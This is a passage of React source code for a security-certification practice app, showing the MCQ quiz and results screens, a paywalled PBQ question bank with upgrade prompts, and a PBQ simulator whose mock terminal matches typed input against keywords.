          <button className={`btn ${reviewMode==="random"?"btn-primary":"btn-outline"}`} style={{fontSize:12}} onClick={()=>setReviewMode("random")}>Random Practice</button>
        </div>
      </div>

      {user.tier==="free"&&(
        <div className="card" style={{padding:"16px 20px",marginBottom:16,borderColor:`${t.accent}30`,background:`${t.accent}06`}}>
          <div style={{display:"flex",gap:12,alignItems:"center",flexWrap:"wrap"}}>
            <div style={{flex:1}}>
              <div style={{fontWeight:600,fontSize:14,color:t.text}}>MCQs stay free. Pro adds exam-style PBQs.</div>
              <div style={{fontSize:13,color:t.textSec}}>When you are ready to practise terminal, log, ordering, and drag/drop simulations, Pro is $4.99/year.</div>
            </div>
            <button className="btn btn-outline" style={{fontSize:12,flexShrink:0}} onClick={onUpgrade}>See Pro PBQs</button>
          </div>
        </div>
      )}
      {user.tier==="pro"&&missedQuestions.length>0&&(
        <div className="card" style={{padding:"16px 20px",marginBottom:16,borderColor:`${t.red}28`,background:`${t.red}06`}}>
          <div style={{display:"flex",gap:12,alignItems:"center",flexWrap:"wrap"}}>
            <div style={{flex:1,minWidth:220}}>
              <div style={{fontWeight:700,fontSize:14,color:t.text}}>Retry missed MCQs</div>
              <div style={{fontSize:13,color:t.textSec}}>You have {missedQuestions.length} MCQ{missedQuestions.length!==1?"s":""} answered incorrectly. Try them again in one focused set.</div>
            </div>
            <button className="btn btn-primary" style={{fontSize:12,flexShrink:0}} onClick={startMissedQuiz}>Review Missed MCQs</button>
          </div>
        </div>
      )}

      <div className="card" style={{padding:"20px 24px",marginBottom:16}}>
        <div style={{fontWeight:600,fontSize:14,color:t.text,marginBottom:14}}>Filter Questions</div>
        <div style={{display:"grid",gridTemplateColumns:"1fr 1fr 1fr",gap:12}}>
          <div>
            <label className="label" style={{display:"block",marginBottom:6}}>Chapter</label>
            <select className="input" value={chFilter} onChange={e=>setChFilter(e.target.value)}>
              <option value="all">All Chapters ({MCQ_BANK.length})</option>
              {CHAPTERS.map(ch=>(
                <option key={ch.id} value={ch.id}>Ch.{ch.id}: {ch.title.slice(0,25)}... ({MCQ_BANK.filter(q=>q.ch===ch.id).length})</option>
              ))}
            </select>
          </div>
          <div>
            <label className="label" style={{display:"block",marginBottom:6}}>Difficulty</label>
            <select className="input" value={diffFilter} onChange={e=>setDiffFilter(e.target.value)}>
              <option value="all">All Difficulties</option>
              <option value="easy">Easy</option>
              <option value="medium">Medium</option>
              <option value="hard">Hard</option>
            </select>
          </div>
          <div>
            <label className="label" style={{display:"block",marginBottom:6}}>Topic</label>
            <select className="input" value={topicFilter} onChange={e=>setTopicFilter(e.target.value)}>
              <option value="all">All Topics</option>
              {allTopics.map(tp=><option key={tp} value={tp}>{tp}</option>)}
            </select>
          </div>
        </div>
        <div style={{marginTop:16}}>
          <label className="label" style={{display:"block",marginBottom:8}}>Quiz Length</label>
          <div style={{display:"grid",gridTemplateColumns:"repeat(5,1fr)",gap:8}}>
            {quizSizes.map(size=>(
              <button
                key={size}
                className={`btn ${quizCount===size?"btn-primary":"btn-ghost"}`}
                style={{fontSize:12,padding:"8px 10px",minHeight:36}}
                disabled={filtered.length<size}
                onClick={()=>setQuizCount(size)}
              >
                {size}
              </button>
            ))}
          </div>
        </div>
        <div style={{marginTop:16,padding:"12px 14px",background:t.panel,borderRadius:7,fontSize:13,color:t.textSec}}>
          {filtered.length} questions match your filters · {filtered.length>=10?`${quizCount} will be selected`:"choose broader filters to reach the 10-question minimum"} · {reviewMode==="smart"?"SM-2 priority order":"Random order"}
        </div>
      </div>

      {/* Chapter overview */}
      <div className="card" style={{padding:"20px 24px",marginBottom:20}}>
        <div style={{fontWeight:600,fontSize:14,color:t.text,marginBottom:14}}>Chapter Overview</div>
        <div style={{display:"flex",flexDirection:"column",gap:10}}>
          {CHAPTERS.map(ch=>(
            <div key={ch.id} className="chapter-card" style={{display:"flex",gap:12,alignItems:"center",padding:"10px 14px",borderRadius:8,background:chFilter===ch.id?`${chapterColor(ch.id)}12`:t.panel,cursor:"pointer",border:`1px solid ${chFilter===ch.id?chapterColor(ch.id):t.border}`,transition:"all .15s"}} onClick={()=>setChFilter(ch.id===chFilter?"all":ch.id)}>
              <ChapterIcon id={ch.id}/>
              <div style={{flex:1}}>
                <div style={{fontSize:13,fontWeight:600,color:t.text}}>Ch.{ch.id}: {ch.title}</div>
                <div style={{fontSize:11,color:t.textDim}}>{ch.weight}% of exam · {MCQ_BANK.filter(q=>q.ch===ch.id).length} questions available</div>
              </div>
              <span className="chip" style={{background:`${t.accent}12`,color:t.accent,borderColor:`${t.accent}25`,fontSize:11}}>{ch.weight}%</span>
            </div>
          ))}
        </div>
      </div>

      <button className="btn btn-primary" style={{width:"100%",justifyContent:"center",padding:"13px",fontSize:15}} onClick={startQuiz} disabled={filtered.length<10}>
        Start Quiz ({quizCount} Questions) →
      </button>
    </div>
  );

  if(done) return(
    <div style={{padding:"24px",maxWidth:760,margin:"0 auto",textAlign:"center"}} className="fu">
      <div style={{fontSize:48,marginBottom:12}}>{scorePct>=.8?"🏆":scorePct>=.5?"✅":"📚"}</div>
      <h2 style={{fontSize:24,fontWeight:700,color:t.text,marginBottom:8}}>Quiz Complete!</h2>
      <div style={{fontSize:42,fontWeight:700,color:scorePct>=.8?t.green:scorePct>=.5?t.amber:t.red,marginBottom:16}}>
        {correctCount}/{questions.length}
      </div>
      <div className="card" style={{padding:"16px 20px",marginBottom:16,textAlign:"left"}}>
        {results.map((r,i)=>(
          <div key={i} style={{display:"flex",gap:8,alignItems:"center",padding:"6px 0",borderBottom:i<results.length-1?`1px solid ${t.border}`:"none"}}>
            <span style={{color:r.correct?t.green:t.red,fontSize:14}}>{r.correct?"✓":"✗"}</span>
            <span style={{fontSize:13,color:t.text,flex:1}}>{questions[i]?.q?.slice(0,60)}...</span>
          </div>
        ))}
      </div>
      {user.tier==="pro"?(
        <div className="card" style={{padding:"18px 20px",marginBottom:16,textAlign:"left",borderColor:`${t.accent}28`,background:`${t.accent}05`}}>
          <div style={{display:"flex",justifyContent:"space-between",gap:12,alignItems:"center",marginBottom:12,flexWrap:"wrap"}}>
            <div>
              <div style={{fontWeight:800,color:t.text,fontSize:15}}>Chapter Improvement Plan</div>
              <div style={{fontSize:12,color:t.textDim}}>Based on this quiz only</div>
            </div>
            <span className="chip" style={{background:`${t.accent}12`,color:t.accent,borderColor:`${t.accent}25`}}>Pro evaluation</span>
          </div>
          {weakChapters.length===0?(
            <div style={{fontSize:13,color:t.textSec,lineHeight:1.7}}>
              Strong set. You did not miss any chapters in this quiz. Keep using Smart Review so older correct answers are spaced out and weak areas return later.
            </div>
          ):(
            <div style={{display:"grid",gap:10}}>
              {weakChapters.map(item=>{
                const accuracy=Math.round((item.correct/item.total)*100);
                const topics=item.focusTopics.length?item.focusTopics.join(" and "):item.chapter.title;
                return(
                  <div key={item.chapter.id} style={{padding:"12px 14px",border:`1px solid ${t.border}`,borderRadius:8,background:t.surface}}>
                    <div style={{display:"flex",justifyContent:"space-between",gap:10,alignItems:"center",marginBottom:6}}>
                      <div style={{fontSize:13,fontWeight:700,color:t.text}}>Ch.{item.chapter.id}: {item.chapter.title}</div>
                      <div style={{fontSize:12,fontWeight:700,color:accuracy>=75?t.green:accuracy>=50?t.amber:t.red}}>{accuracy}%</div>
                    </div>
                    <div style={{fontSize:13,color:t.textSec,lineHeight:1.65}}>
                      Next action: read up more on {topics}, then run Smart Review again with Chapter {item.chapter.id} selected.
                    </div>
                  </div>
                );
              })}
            </div>
          )}
        </div>
      ):(
        <div className="card" style={{padding:"16px 20px",marginBottom:16,textAlign:"left",borderColor:`${t.accent}35`,background:`${t.accent}07`}}>
          <div style={{fontWeight:700,color:t.text,fontSize:14,marginBottom:4}}>Pro unlocks your improvement plan</div>
          <div style={{fontSize:13,color:t.textSec,lineHeight:1.65,marginBottom:10}}>
            After each MCQ test, Pro shows which chapters need work and suggests what to study next, such as PKI, access control, or incident response concepts.
          </div>
          <button className="btn btn-outline" style={{fontSize:12}} onClick={onUpgrade}>See Pro</button>
        </div>
      )}
      {user.tier==="free"&&(
        <div className="card" style={{padding:"16px 20px",marginBottom:16,textAlign:"left",borderColor:`${t.accent}35`,background:`${t.accent}07`}}>
          <div style={{fontWeight:700,color:t.text,fontSize:14,marginBottom:4}}>Want the PBQ side of the exam too?</div>
          <div style={{fontSize:13,color:t.textSec,lineHeight:1.65,marginBottom:10}}>
            Your MCQ practice stays free. Pro adds hands-on PBQ simulations for roughly $0.40/month when billed yearly.
          </div>
          <button className="btn btn-outline" style={{fontSize:12}} onClick={onUpgrade}>Preview Pro PBQs</button>
        </div>
      )}
      <div style={{display:"flex",gap:10,justifyContent:"center"}}>
        <button className="btn btn-primary" onClick={()=>{setStarted(false);setDone(false);}}>New Quiz →</button>
        <button className="btn btn-ghost" onClick={retakeCurrentQuiz}>Retry Same →</button>
      </div>
    </div>
  );

  return(
    <div style={{padding:"24px",maxWidth:700,margin:"0 auto"}} className="fu" key={qi}>
      {/* Progress */}
      <div style={{display:"flex",alignItems:"center",gap:12,marginBottom:20}}>
        <div style={{display:"flex",gap:5}}>
          {questions.map((_,i)=>(
            <button
              key={i}
              aria-label={`Go to question ${i+1}`}
              onClick={()=>goToQuestion(i)}
              style={{width:10,height:10,borderRadius:"50%",border:"none",padding:0,cursor:"pointer",background:results[i]?(results[i]?.correct?t.green:t.red):i===qi?t.accent:draftSelections[i]!==undefined?`${t.amber}`:t.border,transition:"background .3s, transform .18s"}}
            />
          ))}
        </div>
        <span style={{fontSize:13,color:t.textSec,marginLeft:"auto"}}>Question {qi+1} of {questions.length} · {answeredCount} answered</span>
      </div>

      <div style={{display:"flex",gap:10,justifyContent:"space-between",alignItems:"center",marginBottom:16}}>
        <button className="btn btn-ghost" style={{fontSize:12}} disabled={qi===0} onClick={()=>goToQuestion(qi-1)}>← Previous</button>
        <button className="btn btn-ghost" style={{fontSize:12}} disabled={qi===questions.length-1} onClick={()=>goToQuestion(qi+1)}>Next →</button>
      </div>

      {/* Question card */}
      <div className="card" style={{padding:"22px 26px",marginBottom:18}}>
        <div style={{display:"flex",gap:8,marginBottom:12,flexWrap:"wrap"}}>
          <ChBadge chId={current.ch} t={t}/>
          <DiffBadge d={current.difficulty} t={t}/>
          <span className="chip" style={{background:`${t.accent}10`,color:t.textSec,borderColor:t.border,fontSize:11}}>{current.topic}</span>
        </div>
        <p style={{fontSize:16,lineHeight:1.75,color:t.text,fontWeight:500}}>
          <GlossaryText text={current.q} t={t}/>
        </p>
      </div>

      {/* Options */}
      <div style={{display:"flex",flexDirection:"column",gap:9,marginBottom:20}}>
        {current.opts.map((opt,i)=>{
          let cls="opt";
          if(submitted){cls+=" done"; if(i===current.correct)cls+=" ok"; else if(i===selected&&i!==current.correct)cls+=" bad";}
          else if(selected===i)cls+=" sel";
          return(
            <div key={i} className={cls} onClick={()=>{if(submitted)return;setSelected(i);setDraftSelections(prev=>{const next=[...prev];next[qi]=i;return next;});}}>
              <div className="opt-ltr">{String.fromCharCode(65+i)}</div>
              <span style={{fontSize:14,flex:1,lineHeight:1.55,color:t.text}}><GlossaryText text={opt} t={t}/></span>
              {submitted&&i===current.correct&&<span style={{color:t.green,fontSize:14,flexShrink:0,fontWeight:800}}>✓</span>}
              {submitted&&i===selected&&i!==current.correct&&<span style={{color:t.red,fontSize:14,flexShrink:0,fontWeight:800}}>✕</span>}
            </div>
          );
        })}
      </div>

      {!submitted?(
        <button className="btn btn-primary" style={{width:"100%",justifyContent:"center"}} disabled={selected===null} onClick={submitQ}>
          Submit Answer
        </button>
      ):(
        <>
          <div className="card" style={{padding:"16px 18px",marginBottom:14,borderColor:selected===current.correct?`${t.green}42`:`${t.red}42`,background:selected===current.correct?`${t.green}08`:`${t.red}08`,boxShadow:"none"}}>
            <div style={{display:"flex",alignItems:"center",gap:10,fontWeight:800,color:t.text,marginBottom:10,fontSize:15}}>
              <span style={{width:26,height:26,borderRadius:"50%",display:"inline-flex",alignItems:"center",justifyContent:"center",background:selected===current.correct?`${t.green}18`:`${t.red}18`,color:selected===current.correct?t.green:t.red}}>
                {selected===current.correct?"✓":"✕"}
              </span>
              {selected===current.correct?"Nice work":"Not quite"}
            </div>
            {canSeeFeedback?(
              <p style={{fontSize:13,color:t.textSec,lineHeight:1.75}}>{current.exp}</p>
            ):(
              <div>
                <p style={{fontSize:13,color:t.textSec,lineHeight:1.75,marginBottom:10}}>
                  Detailed explanations and per-question feedback are available with Pro.
                </p>
                <button className="btn btn-outline" style={{fontSize:12}} onClick={onUpgrade}>
                  Unlock feedback
                </button>
              </div>
            )}
            {canSeeFeedback&&selected!==current.correct&&current.wrongFeedback&&current.wrongFeedback[selected]&&(
              <div style={{marginTop:12,padding:"12px 14px",background:`${t.red}08`,borderRadius:7,border:`1px solid ${t.red}25`}}>
                <div style={{fontSize:12,fontWeight:600,color:t.red,marginBottom:4}}>Why option {String.fromCharCode(65+selected)} is wrong:</div>
                <div style={{fontSize:13,color:t.textSec,lineHeight:1.6}}>{current.wrongFeedback[selected]}</div>
              </div>
            )}
          </div>
          <button className="btn btn-primary" style={{width:"100%",justifyContent:"center"}} onClick={qi<questions.length-1?nextQ:finishQuiz}>
            {qi<questions.length-1?"Next Question →":allAnswered?"See Results →":"Review Unanswered →"}
          </button>
        </>
      )}
    </div>
  );
}

// ═══════════════════════════════════════════════════════════════
// PBQ BANK
// ═══════════════════════════════════════════════════════════════
function PBQBank({user,attempts,onStart,onUpgrade,t}) {
  const [chFilter,setChFilter]=useState("all");
  const [typeFilter,setTypeFilter]=useState("all");
  const [lockedQuestion,setLockedQuestion]=useState(null);
  const [showMissedOnly,setShowMissedOnly]=useState(false);
  const isPro=user.tier==="pro";
  const attempted=new Set(attempts.map(a=>a.qid));
  const correct=new Set(attempts.filter(a=>a.correct).map(a=>a.qid));
  const missedPbqIds=[...new Set(attempts.filter(a=>a.pbq&&!a.correct).map(a=>a.qid))];

  const filtered=PBQ_BANK.filter(q=>{
    if(chFilter!=="all"&&q.ch!==chFilter)return false;
    if(typeFilter!=="all"&&q.type!==typeFilter)return false;
    if(showMissedOnly&&!missedPbqIds.includes(q.id))return false;
    return true;
  });
  const displayQuestions=[...filtered].sort((a,b)=>{
    const rank=q=>correct.has(q.id)?2:attempted.has(q.id)?0:1;
    return rank(a)-rank(b);
  });
  const openLockedPrompt=q=>{
    capture("pbq_locked_clicked", { question_id: q.id, type: q.type, chapter: q.ch });
    if(shouldShowPBQUpgradePrompt()) setLockedQuestion(q);
  };

  return(
    <div style={{padding:"24px",maxWidth:900,margin:"0 auto"}}>
      <div style={{marginBottom:20}}>
        <h2 style={{fontSize:22,fontWeight:700,color:t.text,marginBottom:4}}>PBQ Simulator</h2>
        <p style={{color:t.textSec,fontSize:14}}>Performance-based questions across 8 simulation types</p>
      </div>

      {/* Stats */}
      <div style={{display:"grid",gridTemplateColumns:"repeat(4,1fr)",gap:10,marginBottom:20}}>
        {[
          {label:"Total PBQs",value:PBQ_BANK.length,color:t.accent},
          {label:"Sim Types",value:Object.keys(SIM_TYPES).length,color:t.text},
          {label:"Attempted",value:attempts.filter(a=>a.pbq).length,color:t.amber},
          {label:"Correct",value:attempts.filter(a=>a.pbq&&a.correct).length,color:t.green},
        ].map(s=>(
          <div key={s.label} className="card" style={{padding:"14px 16px"}}>
            <div style={{fontSize:22,fontWeight:700,color:s.color}}>{s.value}</div>
            <div className="label">{s.label}</div>
          </div>
        ))}
      </div>

      {!isPro&&(
        <div className="card" style={{padding:"18px 22px",marginBottom:20,borderColor:`${t.amber}40`,background:`${t.amber}06`}}>
          <div style={{display:"flex",gap:12,alignItems:"center",flexWrap:"wrap"}}>
            <div style={{flex:1}}>
              <div style={{fontWeight:600,fontSize:15,color:t.text,marginBottom:4}}>Pro Required for PBQ Access</div>
              <div style={{fontSize:13,color:t.textSec}}>MCQs are free. Pro unlocks all {PBQ_BANK.length} PBQ simulations with terminal commands, drag & drop, log analysis, and more.</div>
            </div>
            <button className="btn btn-primary" style={{flexShrink:0}} onClick={()=>{capture("upgrade_prompt_clicked", { source: "pbq_access_banner", tier: user.tier });onUpgrade();}}>Upgrade — $4.99/year →</button>
          </div>
        </div>
      )}

      {!isPro&&lockedQuestion&&(
        <div className="card" style={{padding:"18px 22px",marginBottom:20,borderColor:`${t.accent}40`,background:`${t.accent}08`}}>
          <div style={{display:"flex",gap:12,alignItems:"flex-start",flexWrap:"wrap"}}>
            <span style={{fontSize:24}}>🔒</span>
            <div style={{flex:1,minWidth:220}}>
              <div style={{fontWeight:700,fontSize:15,color:t.text,marginBottom:4}}>{lockedQuestion.title} is a Pro PBQ</div>
              <div style={{fontSize:13,color:t.textSec,lineHeight:1.65}}>
                This is the kind of performance-based simulation that helps SecurePlus stand out from normal MCQ-only practice. Upgrade when you want full PBQ practice.
              </div>
            </div>
            <div style={{display:"flex",gap:8,flexWrap:"wrap"}}>
              <button className="btn btn-primary" style={{fontSize:13}} onClick={()=>{capture("upgrade_prompt_clicked", { source: "locked_pbq_prompt", question_id: lockedQuestion.id, tier: user.tier });onUpgrade();}}>Unlock PBQs</button>
              <button className="btn btn-ghost" style={{fontSize:13}} onClick={()=>setLockedQuestion(null)}>Not now</button>
            </div>
          </div>
        </div>
      )}
      {isPro&&(
        <div className="card" style={{padding:"16px 20px",marginBottom:18,borderColor:showMissedOnly?`${t.red}35`:t.border,background:showMissedOnly?`${t.red}06`:t.surface}}>
          <div style={{display:"flex",gap:12,alignItems:"center",flexWrap:"wrap"}}>
            <div style={{flex:1,minWidth:220}}>
              <div style={{fontWeight:700,fontSize:14,color:t.text}}>Retry missed PBQs</div>
              <div style={{fontSize:13,color:t.textSec}}>
                {missedPbqIds.length>0?`You have ${missedPbqIds.length} PBQ${missedPbqIds.length!==1?"s":""} answered incorrectly. Filter them here and try again.`:"No missed PBQs yet. Incorrect PBQs will appear here for focused review."}
              </div>
            </div>
            <button className={`btn ${showMissedOnly?"btn-primary":"btn-outline"}`} style={{fontSize:12,flexShrink:0}} disabled={missedPbqIds.length===0} onClick={()=>setShowMissedOnly(v=>!v)}>
              {showMissedOnly?"Show All PBQs":"Review Missed PBQs"}
            </button>
          </div>
        </div>
      )}

      {/* Sim type cards */}
      <div style={{display:"grid",gridTemplateColumns:"repeat(auto-fill,minmax(140px,1fr))",gap:10,marginBottom:20}}>
        {Object.values(SIM_TYPES).map(s=>{
          const count=PBQ_BANK.filter(q=>q.type===s.id).length;
          const active=typeFilter===s.id;
          return(
            <div key={s.id} className="card sim-card" style={{padding:"14px 16px",cursor:"pointer",borderColor:active?s.color:t.border,background:active?`${s.color}10`:t.surface,transition:"all .15s"}} onClick={()=>setTypeFilter(active?"all":s.id)}>
              <div style={{marginBottom:8}}><SimIcon type={s.id}/></div>
              <div style={{fontSize:12,fontWeight:600,color:active?s.color:t.text}}>{s.label}</div>
              <div style={{fontSize:11,color:t.textDim,marginTop:2}}>{count} question{count!==1?"s":""}</div>
            </div>
          );
        })}
      </div>

      {/* Filters */}
      <div style={{display:"flex",gap:8,marginBottom:14,flexWrap:"wrap"}}>
        {CHAPTERS.map(ch=>(
          <button key={ch.id} className="btn" style={{fontSize:11,padding:"5px 12px",background:chFilter===ch.id?`${t.accent}15`:"transparent",color:chFilter===ch.id?t.accent:t.textSec,border:`1px solid ${chFilter===ch.id?t.accent:t.border}`,transition:"all .15s"}} onClick={()=>setChFilter(chFilter===ch.id?"all":ch.id)}>
            <ChapterIcon id={ch.id} size={18}/> Ch.{ch.id}
          </button>
        ))}
        {chFilter!=="all"&&<button className="btn btn-ghost" style={{fontSize:11,padding:"5px 10px"}} onClick={()=>setChFilter("all")}>Clear ✕</button>}
      </div>

      <div style={{fontSize:13,color:t.textDim,marginBottom:12}}>Showing {displayQuestions.length} questions · correctly answered PBQs are kept lower in the list</div>

      {/* Question list */}
      <div style={{display:"flex",flexDirection:"column",gap:8}}>
        {displayQuestions.map(q=>{
          const done=attempted.has(q.id);
          const ok=correct.has(q.id);
          const ch=CHAPTERS.find(c=>c.id===q.ch);
          return(
            <div key={q.id} className={`card card-hover`} style={{padding:"14px 18px",display:"flex",alignItems:"center",gap:12,cursor:"pointer",opacity:isPro?1:.75}} onClick={()=>{if(isPro){capture("pbq_started", { question_id: q.id, type: q.type, chapter: q.ch, tier: user.tier });onStart(q);}else{openLockedPrompt(q);}}}>
              <SimIcon type={q.type}/>
              <div style={{flex:1,minWidth:0}}>
                <div style={{display:"flex",gap:8,marginBottom:5,flexWrap:"wrap"}}>
                  <SimBadge type={q.type} t={t}/>
                  <DiffBadge d={q.difficulty} t={t}/>
                  {ch&&<span style={{fontSize:11,color:t.textDim,display:"inline-flex",alignItems:"center",gap:4}}><ChapterIcon id={ch.id} size={16}/> Ch.{ch.id}</span>}
                </div>
                <div style={{fontSize:14,fontWeight:500,color:t.text}}>{q.title}</div>
                <div style={{fontSize:12,color:t.textDim,marginTop:2}}>{q.cat}</div>
              </div>
              <div style={{flexShrink:0,display:"flex",gap:8,alignItems:"center"}}>
                {done?<span style={{color:ok?t.green:t.red,fontSize:15}}>{ok?"✓":"✗"}</span>:<span style={{fontSize:12,color:t.textDim}}>○</span>}
                {isPro?<span style={{color:t.accent,fontSize:16}}>▶</span>:<span style={{fontSize:13}}>🔒</span>}
              </div>
            </div>
          );
        })}
      </div>
    </div>
  );
}

// ═══════════════════════════════════════════════════════════════
// PBQ SIMULATOR
// ═══════════════════════════════════════════════════════════════
function PBQSim({q,onDone,onNext,nextQuestion,t}) {
  const [termInput,setTermInput]=useState("");
  const [termHistory,setTermHistory]=useState([]);
  const [selected,setSelected]=useState(null);
  const [submitted,setSubmitted]=useState(false);
  const [mapping,setMapping]=useState({});
  const [orderItems,setOrderItems]=useState(()=>q.items?[...q.items].sort(()=>Math.random()-.5):[]);
  const [blanks,setBlanks]=useState(()=>q.blanks?Object.fromEntries(q.blanks.map(b=>[b.id,""])):{}); 
  const [dragOver,setDragOver]=useState(null);
  const [dragged,setDragged]=useState(null);
  const [tapDragItem,setTapDragItem]=useState(null);
  const [showHint,setShowHint]=useState(false);

  const isCorrect=()=>{
    if(["TERMINAL SIM","HOTSPOT","LOG ANALYSIS","CONFIG/ACL","SCENARIO"].includes(q.type))return selected===q.correct;
    if(q.type==="DRAG & DROP")return q.items?.every(item=>mapping[item.id]===q.correctMapping?.[item.id]);
    if(q.type==="ORDERING")return q.correctOrder?.every((id,i)=>orderItems[i]?.id===id);
    if(q.type==="FILL BLANK")return q.blanks?.every(b=>blanks[b.id]?.trim().toLowerCase()===b.answer.toLowerCase());
    return false;
  };

  const submit=()=>{
    const correct = isCorrect();
    capture("pbq_question_answered", { question_id: q.id, type: q.type, chapter: q.ch, correct });
    setSubmitted(true);
  };

  const runTerminal=()=>{
    const cmd=termInput.trim();
    if(!cmd)return;
    setTermHistory(h=>[...h,{type:"cmd",text:cmd}]);
    const keywords=["scan","nmap","hash","sha","list","process","connect","netstat","ls","chmod","cat","grep","show","check","run","get","find","read"];
    if(keywords.some(k=>cmd.toLowerCase().includes(k))){
      setTermHistory(h=>[...h,{type:"output",text:q.answer||"Command executed."}]);
    } else {
      setTermHistory(h=>[...h,{type:"error",text:`Command not recognised. Hint: ${q.hint||"Try a relevant command."}`}]);
    }
    setTermInput("");
  };

  const simType=Object.values(SIM_TYPES).find(s=>s.id===q.type)||SIM_TYPES.TERMINAL;
  const placeDragItem=(item,targetId)=>{
    if(!item)return;
    setMapping(m=>{
      const n={...m};
      Object.keys(n).forEach(k=>{if(n[k]===targetId)delete n[k];});
      n[item.id]=targetId;
      return n;
    });
    setTapDragItem(null);
    setDragged(null);
  };
  const updatePointerDropTarget=e=>{
    const el=document.elementFromPoint(e.clientX,e.clientY)?.closest?.("[data-drop-target]");
    setDragOver(el?.dataset?.dropTarget||null);
    return el?.dataset?.dropTarget||null;
  };
  const finishPointerDrag=(e,item)=>{
    const targetId=updatePointerDropTarget(e);
    if(targetId) placeDragItem(item,targetId);
    setDragOver(null);
    setDragged(null);
  };

  return(
    <div style={{padding:"24px",maxWidth:860,margin:"0 auto"}}>
      {/* Header */}
      <div style={{display:"flex",alignItems:"center",gap:12,marginBottom:18,flexWrap:"wrap"}}>
        <button className="btn btn-ghost" style={{fontSize:12}} onClick={()=>onDone(null)}>← Back to PBQ Bank</button>
        <SimIcon type={q.type}/>
        <div style={{flex:1,minWidth:0}}>
          <div style={{fontWeight:600,fontSize:15,color:t.text}}>{q.title}</div>
          <div style={{display:"flex",gap:8,marginTop:4}}><SimBadge type={q.type} t={t}/><DiffBadge d={q.difficulty} t={t}/></div>
        </div>
      </div>

      {/* Scenario */}
      <div className="card" style={{padding:"18px 22px",marginBottom:18,borderLeft:`3px solid ${simType.color}`}}>
        <div className="label" style={{marginBottom:8}}>Scenario</div>
        <p style={{fontSize:14,color:t.textSec,lineHeight:1.75}}><GlossaryText text={q.scenario} t={t}/></p>
        {q.steps&&<div style={{marginTop:12}}>
          {q.steps.map((s,i)=><div key={i} style={{fontSize:12,color:t.textDim,padding:"2px 0"}}><span style={{color:simType.color,fontWeight:600,marginRight:8}}>{i+1}.</span>{s}</div>)}
        </div>}
      </div>

      {/* TERMINAL */}
      {q.type==="TERMINAL SIM"&&(
        <div style={{marginBottom:18}}>
          <div style={{fontWeight:500,fontSize:13,color:t.text,marginBottom:8}}>Terminal</div>
          <div className="terminal" style={{minHeight:160}}>
            {termHistory.length===0&&<div style={{color:"#8b949e"}}>Type a command and press Enter. {q.hint}</div>}
            {termHistory.map((h,i)=>(
              <div key={i} style={{color:h.type==="cmd"?"#79c0ff":h.type==="error"?"#f85149":"#c9d1d9"}}>
                {h.type==="cmd"&&<span style={{color:"#56d364",marginRight:8}}>$</span>}
                {h.text}
              </div>
            ))}
          </div>
          <div style={{display:"flex",gap:8,marginTop:8}}>
            <input className="input" value={termInput} onChange={e=>setTermInput(e.target.value)} onKeyDown={e=>e.key==="Enter"&&runTerminal()} placeholder="Enter command..." style={{fontFamily:"'JetBrains Mono',monospace",fontSize:13}}/>
            <button className="btn btn-outline" style={{fontSize:12,flexShrink:0}} onClick={runTerminal}>Run</button>
          </div>
          <button className="btn btn-ghost" style={{fontSize:11,marginTop:8}} onClick={()=>setShowHint(!showHint)}>
            {showHint?"Hide hint":"Show hint"}
          </button>
          {showHint&&<div style={{fontSize:12,color:t.textDim,marginTop:6,padding:"8px 12px",background:t.panel,borderRadius:6}}>{q.hint}</div>}
        </div>
      )}

      {/* LOG ANALYSIS */}
      {q.type==="LOG ANALYSIS"&&(
        <div style={{marginBottom:18}}>
          <div style={{fontWeight:500,fontSize:13,color:t.text,marginBottom:8}}>Log Data</div>
          <div className="log-block">{q.logData}</div>
        </div>
      )}

      {/* CONFIG/ACL */}
      {q.type==="CONFIG/ACL"&&(
        <div style={{marginBottom:18}}>
          <div style={{fontWeight:500,fontSize:13,color:t.text,marginBottom:8}}>Current Configuration (has issues)</div>
          <div className="terminal" style={{color:"#e6c07b",fontSize:12,minHeight:80}}>{q.currentConfig}</div>
        </div>
      )}

      {/* HOTSPOT */}
      {q.type==="HOTSPOT"&&(
        <div style={{marginBottom:18}}>
          <div style={{fontWeight:500,fontSize:13,color:t.text,marginBottom:8}}>Scenario Details</div>
          <pre className="log-block" style={{fontSize:13}}>{q.diagram}</pre>
        </div>
      )}

      {/* SCENARIO */}
      {q.type==="SCENARIO"&&(
        <div style={{marginBottom:18}}>
          <div style={{fontWeight:500,fontSize:13,color:t.text,marginBottom:8}}>Full Scenario</div>
          <div className="card" style={{padding:"16px 20px",fontSize:13,color:t.textSec,lineHeight:1.8,whiteSpace:"pre-wrap"}}><GlossaryText text={q.scenario} t={t}/></div>
        </div>
      )}

      {/* DRAG & DROP */}
      {q.type==="DRAG & DROP"&&!submitted&&(
        <div style={{marginBottom:18}}>
          <div style={{fontWeight:500,fontSize:13,color:t.text,marginBottom:6}}>Match each item to its target</div>
          <div style={{fontSize:12,color:t.textDim,marginBottom:12}}>On mobile, tap an item, then tap its target.</div>
          <div style={{display:"grid",gridTemplateColumns:"1fr 1fr",gap:16}}>
            <div>
              <div className="label" style={{marginBottom:8}}>Items</div>
              <div style={{display:"flex",flexDirection:"column",gap:6}}>
                {q.items.filter(item=>!Object.keys(mapping).includes(item.id)).map(item=>(
                  <div
                    key={item.id}
                    className={`drag-item ${tapDragItem?.id===item.id||dragged?.id===item.id?"selected":""}`}
                    draggable
                    onClick={()=>setTapDragItem(item)}
                    onDragStart={()=>setDragged(item)}
                    onDragEnd={()=>setDragged(null)}
                    onPointerDown={e=>{if(e.pointerType!=="mouse"){setDragged(item);setTapDragItem(item);e.currentTarget.setPointerCapture?.(e.pointerId);}}}
                    onPointerMove={e=>{if(dragged?.id===item.id||tapDragItem?.id===item.id) updatePointerDropTarget(e);}}
                    onPointerUp={e=>{if(e.pointerType!=="mouse") finishPointerDrag(e,item);}}
                    style={{touchAction:"none"}}
                  >
                    {item.label}
                  </div>
                ))}
              </div>
            </div>
            <div>
              <div className="label" style={{marginBottom:8}}>Targets</div>
              <div style={{display:"flex",flexDirection:"column",gap:6}}>
                {q.targets?.map(target=>{
                  const placed=q.items.find(i=>mapping[i.id]===target.id);
                  return(
                    <div key={target.id}>
                      <div style={{fontSize:11,color:t.textDim,marginBottom:3}}>{target.label}</div>
                      <div className={`drop-zone ${dragOver===target.id?"over":""} ${placed?"filled":""}`}
                        data-drop-target={target.id}
                        onClick={()=>tapDragItem&&placeDragItem(tapDragItem,target.id)}
                        onDragOver={e=>{e.preventDefault();setDragOver(target.id);}}
                        onDragLeave={()=>setDragOver(null)}
                        onDrop={()=>{
                          if(dragged) placeDragItem(dragged,target.id);
                          setDragOver(null);setDragged(null);
                        }}>
